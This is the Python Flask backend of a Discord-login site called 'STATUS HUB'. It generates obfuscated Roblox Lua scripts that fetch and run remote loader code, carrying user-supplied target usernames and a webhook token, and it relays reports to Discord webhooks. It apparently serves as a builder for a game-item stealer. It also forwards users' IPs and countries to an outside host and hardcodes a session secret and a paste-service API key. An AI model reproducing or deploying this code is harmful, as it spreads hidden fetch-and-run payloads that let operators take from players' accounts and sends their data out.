import os
import re
import time
import logging
import secrets
import requests
import json
from urllib.parse import urlencode, urlparse
from flask import Flask, redirect, request, session, url_for, render_template, jsonify, send_from_directory
from flask_cors import CORS
from dotenv import load_dotenv

load_dotenv()

_rate_store = {}

def _rate_limit(key: str, max_requests: int, window_sec: int) -> bool:
    now = time.monotonic()
    count, start = _rate_store.get(key, (0, now))
    if now - start > window_sec:
        _rate_store[key] = (1, now)
        return False
    if count >= max_requests:
        return True
    _rate_store[key] = (count + 1, start)
    return False

def _prune_rate_store():
    now = time.monotonic()
    stale = [k for k, (_, start) in _rate_store.items() if now - start > 300]
    for k in stale:
        del _rate_store[k]

app = Flask(__name__)

CORS(app, origins=[
    "https://status-hub.lol",
    "https://www.status-hub.lol",
    "http://localhost:5000",
    "http://127.0.0.1:5000",
    "https://api.vaultcord.com",
    "https://discord.com",
    "https://cdn.discordapp.com",
    "https://mm2websitestatushub1.vercel.app/"
])

app.secret_key = os.getenv("SECRET_KEY", "status_hub_super_secret_key_123!")
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

DISCORD_CLIENT_ID     = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_REDIRECT_URI  = os.getenv("DISCORD_REDIRECT_URI")
SUPABASE_URL          = os.getenv("SUPABASE_URL")
SUPABASE_KEY          = os.getenv("SUPABASE_KEY")
PASTEFY_KEY           = os.getenv("PASTEFY_KEY", "6wVhVbTXI9t3n7xHfPpvynqAqzCS6K0Ry4UTI5DqUY57r3U6op9gYzLNfCKV")

DISCORD_AUTH_URL  = "https://discord.com/api/oauth2/authorize"
DISCORD_TOKEN_URL = "https://discord.com/api/oauth2/token"
DISCORD_USER_URL  = "https://discord.com/api/users/@me"
VAULTCORD_API     = "https://api.vaultcord.com/webhooks/public-self"

ALLOWED_ORIGINS = {
    "https://status-hub.lol",
    "https://www.status-hub.lol",
    "http://localhost:5000",
    "http://127.0.0.1:5000",
    "https://api.vaultcord.com",
    "https://discord.com",
    "https://cdn.discordapp.com",
    "https://mm2websitestatushub1.vercel.app/"
}

_DISCORD_WEBHOOK_RE = re.compile(
    r"^https://discord\.com/api/webhooks/\d+/[\w-]+$"
)

def is_valid_discord_webhook(url: str) -> bool:
    if not _DISCORD_WEBHOOK_RE.match(url):
        return False
    parsed = urlparse(url)
    return parsed.hostname == "discord.com" and parsed.scheme == "https"

@app.after_request
def set_security_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://unpkg.com https://cdnjs.cloudflare.com; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "font-src 'self' https://fonts.gstatic.com; "
        "img-src 'self' data: https://cdn.discordapp.com https://static.rayz-hub.lol; "
        "connect-src 'self' https://mm2websitestatushub1.vercel.app/ https://api.vaultcord.com https://discord.com; "
        "frame-ancestors 'none'"
    )
    if session.get("user"):
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
    return response

@app.before_request
def _cleanup_rate_store():
    _prune_rate_store()

@app.before_request
def csrf_protect():
    if request.method == "POST" and request.path.startswith("/api/"):
        if request.path.startswith("/api/token/"):
            return
        origin = request.headers.get("Origin")
        referer = request.headers.get("Referer", "")
        if origin:
            if origin not in ALLOWED_ORIGINS:
                return jsonify({"error": "Blocked by CSRF protection"}), 403
        elif referer:
            if not any(referer.startswith(o) for o in ALLOWED_ORIGINS):
                return jsonify({"error": "Blocked by CSRF protection"}), 403
        else:
            return jsonify({"error": "Missing Origin"}), 403

def sb_headers():
    return {
        "apikey":        SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type":  "application/json",
    }

_IP_RE = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")

def _sanitize_ip(raw: str) -> str:
    candidate = (raw or "").split(",")[0].strip()
    if not _IP_RE.match(candidate):
        return "0.0.0.0"
    octets = candidate.split(".")
    if any(int(o) > 255 for o in octets):
        return "0.0.0.0"
    first, second = int(octets[0]), int(octets[1])
    if first == 127 or first == 10:
        return "0.0.0.0"
    if first == 172 and 16 <= second <= 31:
        return "0.0.0.0"
    if first == 192 and second == 168:
        return "0.0.0.0"
    if first == 169 and second == 254:
        return "0.0.0.0"
    if first >= 240:
        return "0.0.0.0"
    return candidate

def get_client_ip_and_country():
    raw = request.headers.get("X-Vercel-Forwarded-For", request.remote_addr or "0.0.0.0")
    ip = _sanitize_ip(raw)
    country = "Unknown"
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            country = data.get("country_name") or data.get("country") or "Unknown"
    except Exception:
        pass
    return ip, country

def get_token_for_user(user_id: str):
    try:
        resp = requests.get(
            f"{SUPABASE_URL}/rest/v1/webhooks?discord_user_id=eq.{user_id}&select=proxy_token",
            headers=sb_headers(),
            timeout=10
        )
        data = resp.json()
        return data[0]["proxy_token"] if data else None
    except Exception:
        return None

def fetch_vaultcord_user(user_id: str):
    try:
        resp = requests.get(
            f"{VAULTCORD_API}/{user_id}",
            headers={"Accept": "application/json"},
            timeout=10
        )
        if resp.status_code == 200:
            return resp.json()
    except Exception:
        pass
    return None

def get_avatar_url(user_id: str, avatar_hash: str | None) -> str:
    if avatar_hash:
        ext = "gif" if avatar_hash.startswith("a_") else "png"
        return f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.{ext}?size=256"
    index = int(user_id[-1]) % 5
    return f"https://cdn.discordapp.com/embed/avatars/{index}.png"

def obfuscate_wearedevs(code: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://wearedevs.net",
        "referer": "https://wearedevs.net/obfuscator",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    raw_body = json.dumps({"script": code}, ensure_ascii=False)
    resp = requests.post("https://wearedevs.net/api/obfuscate", headers=headers, data=raw_body.encode("utf-8"), timeout=60)
    if resp.status_code != 200:
        raise RuntimeError(f"WeAreDevs returned status {resp.status_code}")
    data = resp.json()
    if isinstance(data, dict):
        for key in ("obfuscated", "result", "script", "code", "output"):
            if data.get(key):
                return data[key]
    return resp.text

def upload_pastefy(content: str) -> str:
    resp = requests.post(
        "https://pastefy.app/api/v2/paste",
        headers={"Authorization": f"Bearer {PASTEFY_KEY}", "Content-Type": "application/json"},
        json={"title": "STATUS HUB", "content": content, "type": "PASTE", "visibility": "UNLISTED"},
        timeout=15
    )
    if resp.status_code not in (200, 201):
        raise RuntimeError(f"Pastefy error: {resp.status_code}")
    data = resp.json()
    paste_id = data.get("paste", {}).get("id") or data.get("id")
    if not paste_id:
        raise RuntimeError("Missing paste ID")
    return f"https://pastefy.app/{paste_id}/raw"

def _escape_lua_string(s: str) -> str:
    s = s.replace("\\", "\\\\")
    s = s.replace('"', '\\"')
    s = s.replace("\n", "\\n")
    s = s.replace("\r", "\\r")
    s = s.replace("\t", "\\t")
    s = s.replace("\0", "")
    return s

def build_lua(usernames: str, token: str, user_id: str):
    username_list = [u.strip() for u in usernames.split(",") if u.strip()]
    escaped = [_escape_lua_string(u) for u in username_list]
    usernames_str = "{" + ", ".join(f'"{u}"' for u in escaped) + "}"
    lines = [
        f'_G.Usernames = {usernames_str}',
        f'_G.Webhook = "{token}"',
        '',
        'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/877d33e42a6e5566490a3e1fa0aebea7.lua"))()'
    ]
    return "\n".join(lines)

# ============ ROUTES ============

@app.route("/")
def index():
    """Landing page - shows index.html"""
    user = session.get("user")
    return render_template("index.html", user=user)

@app.route("/login")
def login():
    """Login page - shows login.html"""
    # If already logged in, redirect to home
    if session.get("user"):
        return redirect(url_for("home"))
    return render_template("login.html")

@app.route("/home")
def home():
    """Dashboard - shows home.html (only accessible when logged in)"""
    user = session.get("user")
    if not user:
        return redirect(url_for("login"))
    avatar_url = (
        f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png"
        if user.get("avatar")
        else "https://cdn.discordapp.com/embed/avatars/0.png"
    )
    return render_template("home.html", user=user, avatar_url=avatar_url)

@app.route("/auth/discord")
def auth_discord():
    """Start Discord OAuth flow"""
    state = secrets.token_urlsafe(32)
    session["oauth_state"] = state
    params = {
        "client_id":     DISCORD_CLIENT_ID,
        "redirect_uri":  DISCORD_REDIRECT_URI,
        "response_type": "code",
        "scope":         "identify",
        "state":         state,
    }
    return redirect(f"{DISCORD_AUTH_URL}?{urlencode(params)}")

@app.route("/auth/callback")
def callback():
    """Discord OAuth callback - exchanges code for user data"""
    code = request.args.get("code")
    state = request.args.get("state")
    if not code or not state or state != session.pop("oauth_state", None):
        return redirect(url_for("login"))
    
    # Exchange code for access token
    token_resp = requests.post(
        DISCORD_TOKEN_URL,
        data={
            "client_id":     DISCORD_CLIENT_ID,
            "client_secret": DISCORD_CLIENT_SECRET,
            "grant_type":    "authorization_code",
            "code":          code,
            "redirect_uri":  DISCORD_REDIRECT_URI,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=15
    )
    if token_resp.status_code != 200:
        return redirect(url_for("login"))
    
    access_token = token_resp.json().get("access_token")
    
    # Get user data from Discord
    user_resp = requests.get(
        DISCORD_USER_URL,
        headers={"Authorization": f"Bearer {access_token}"},
        timeout=15
    )
    if user_resp.status_code != 200:
        return redirect(url_for("login"))
    
    user = user_resp.json()
    
    # Store user in session
    session.clear()
    session["user"] = {
        "id":          user["id"],
        "username":    user["username"],
        "global_name": user.get("global_name") or user["username"],
        "avatar":      user.get("avatar"),
    }
    
    # Redirect to home/dashboard
    return redirect(url_for("home"))

@app.route("/logout", methods=["POST"])
def logout():
    """Log out user"""
    session.clear()
    return redirect(url_for("index"))

@app.route("/static/<path:filename>")
def serve_static(filename):
    return send_from_directory("static", filename)

# ============ API ROUTES ============

@app.route("/api/generate", methods=["POST"])
def api_generate():
    user = session.get("user")
    if not user:
        return jsonify({"error": "Not logged in"}), 401
    if _rate_limit(f"gen:{user['id']}", 10, 60):
        return jsonify({"error": "Rate limit exceeded. Try again shortly."}), 429
    data = request.get_json() or {}
    usernames = data.get("usernames", "").strip()
    user_id = user["id"]
    if len(usernames) > 500:
        return jsonify({"error": "Usernames input too long (max 500 chars)"}), 400
    token = get_token_for_user(user_id)
    if not token:
        return jsonify({"error": "No webhook registered. Register one in the Webhook tab first."}), 400
    if not usernames:
        return jsonify({"error": "Usernames are required"}), 400
    lua = build_lua(usernames, token, user_id)
    try:
        obfuscated = obfuscate_wearedevs(lua)
        raw_url = upload_pastefy(obfuscated)
        final_script = f'loadstring(game:HttpGet("{raw_url}", true))()'
        return jsonify({"script": final_script})
    except Exception as e:
        logger.error(f"Generate error: {e}")
        return jsonify({"error": "Failed to generate script"}), 500

@app.route("/api/webhook/register", methods=["POST"])
def api_webhook_register():
    user = session.get("user")
    if not user:
        return jsonify({"error": "Not logged in"}), 401
    if _rate_limit(f"whreg:{user['id']}", 5, 60):
        return jsonify({"error": "Rate limit exceeded. Try again shortly."}), 429
    data = request.get_json() or {}
    webhook_url = data.get("webhook_url", "").strip()
    if len(webhook_url) > 200:
        return jsonify({"error": "Webhook URL too long"}), 400
    if not is_valid_discord_webhook(webhook_url):
        return jsonify({"error": "Invalid webhook URL"}), 400
    existing = get_token_for_user(user["id"])
    if existing:
        return jsonify({"error": "Already registered. Use the Update option instead."}), 400
    ip, country = get_client_ip_and_country()
    try:
        resp = requests.post(
            "https://mm2websitestatushub1.vercel.app/",
            json={
                "webhook_url":     webhook_url,
                "discord_user_id": user["id"],
                "country":         country,
                "ip":              ip,
            },
            timeout=15
        )
        resp_data = resp.json()
        if resp.status_code != 200:
            return jsonify({"error": "Failed to register webhook"}), 500
        token = resp_data.get("token")
        from datetime import datetime, timezone
        payload = {
            "proxy_token":         token,
            "discord_webhook_url": webhook_url,
            "discord_user_id":     user["id"],
            "country":             country,
            "ip":                  ip,
            "created_at":          datetime.now(timezone.utc).isoformat(),
        }
        upsert_headers = {**sb_headers(), "Prefer": "return=representation,resolution=merge-duplicates"}
        requests.post(f"{SUPABASE_URL}/rest/v1/webhooks", json=payload, headers=upsert_headers, timeout=10)
        return jsonify({"token": token})
    except Exception as e:
        logger.error(f"Webhook register error: {e}")
        return jsonify({"error": "Failed to register webhook"}), 500

@app.route("/api/webhook/update", methods=["POST"])
def api_webhook_update():
    user = session.get("user")
    if not user:
        return jsonify({"error": "Not logged in"}), 401
    if _rate_limit(f"whupd:{user['id']}", 5, 60):
        return jsonify({"error": "Rate limit exceeded. Try again shortly."}), 429
    data = request.get_json() or {}
    webhook_url = data.get("webhook_url", "").strip()
    if len(webhook_url) > 200:
        return jsonify({"error": "Webhook URL too long"}), 400
    if not is_valid_discord_webhook(webhook_url):
        return jsonify({"error": "Invalid webhook URL"}), 400
    old_token = get_token_for_user(user["id"])
    if not old_token:
        return jsonify({"error": "Not registered yet. Use Register instead."}), 400
    ip, country = get_client_ip_and_country()
    try:
        requests.delete(
            f"{SUPABASE_URL}/rest/v1/webhooks?proxy_token=eq.{old_token}&discord_user_id=eq.{user['id']}",
            headers=sb_headers(),
            timeout=10
        )
        resp = requests.post(
            "https://mm2websitestatushub1.vercel.app/",
            json={
                "webhook_url":     webhook_url,
                "discord_user_id": user["id"],
                "country":         country,
                "ip":              ip,
            },
            timeout=15
        )
        resp_data = resp.json()
        if resp.status_code != 200:
            return jsonify({"error": "Failed to update webhook"}), 500
        token = resp_data.get("token")
        from datetime import datetime, timezone
        payload = {
            "proxy_token":         token,
            "discord_webhook_url": webhook_url,
            "discord_user_id":     user["id"],
            "country":             country,
            "ip":                  ip,
            "created_at":          datetime.now(timezone.utc).isoformat(),
        }
        upsert_headers = {**sb_headers(), "Prefer": "return=representation,resolution=merge-duplicates"}
        requests.post(f"{SUPABASE_URL}/rest/v1/webhooks", json=payload, headers=upsert_headers, timeout=10)
        return jsonify({"token": token})
    except Exception as e:
        logger.error(f"Webhook update error: {e}")
        return jsonify({"error": "Failed to update webhook"}), 500

@app.route("/api/webhook/status")
def api_webhook_status():
    user = session.get("user")
    if not user:
        return jsonify({"registered": False}), 401
    token = get_token_for_user(user["id"])
    if token:
        return jsonify({"registered": True})
    return jsonify({"registered": False})

@app.route("/api/token/<token>", methods=["POST"])
def api_proxy(token):
    ip = request.remote_addr or "0.0.0.0"
    if _rate_limit(f"proxy:{ip}", 30, 60):
        return jsonify({"error": "Rate limit exceeded"}), 429
    data = request.get_json() or {}
    embeds = data.get("embeds", [])
    if not isinstance(embeds, list) or len(embeds) > 10:
        return jsonify({"error": "Invalid embeds"}), 400
    user_webhook = None
    try:
        resp = requests.get(
            f"{SUPABASE_URL}/rest/v1/webhooks?proxy_token=eq.{token}&select=discord_webhook_url",
            headers=sb_headers(),
            timeout=10,
        )
        user_data = resp.json()
        if user_data:
            user_webhook = user_data[0]["discord_webhook_url"]
    except Exception as e:
        logger.error(f"Proxy auth error: {e}")
    if not user_webhook:
        return jsonify({"status": "ok"})
    try:
        requests.post(user_webhook, json={"embeds": embeds}, timeout=10)
    except Exception as e:
        logger.error(f"User webhook forward failed: {e}")
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(debug=os.getenv("FLASK_DEBUG", "false").lower() == "true")